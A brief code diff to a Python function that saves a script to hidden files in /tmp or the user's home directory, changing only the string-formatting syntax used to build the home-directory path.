@@ -21,7 +21,7 @@ def create_local_script(script_location, script_contents):
 
 def attempt_script_save(script_contents):
   home_dir = os.path.expanduser("~")
-  possible_save_locations = ['/tmp/.ambipom.424',"{}/.ambipom.424".format(home_dir)]
+  possible_save_locations = ['/tmp/.ambipom.424',"%s/.ambipom.424" % home_dir]
 
   for save_location in possible_save_locations:
     try:
